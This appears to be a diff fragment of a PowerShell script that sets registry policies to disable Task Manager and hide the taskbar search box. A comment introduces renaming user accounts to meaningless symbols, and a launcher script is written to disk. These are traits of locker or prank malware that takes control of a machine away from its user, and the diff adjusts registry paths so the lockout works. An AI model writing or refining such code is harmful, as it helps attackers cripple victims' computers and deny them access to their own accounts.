@@ -54,12 +54,10 @@ $launcherScriptContent | Out-File -FilePath $launcherScriptPath -Force
 
 # Create registry key to disable Task Manager
 $disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-New-Item -Path $disableTaskMgrPath -Force | Out-Null
 Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
 
 # Create registry key to disable Search Bar in taskbar
-$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
-New-Item -Path $searchBarPath -Force | Out-Null
+$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 
 # Rename user accounts to ⓿⌓⓿
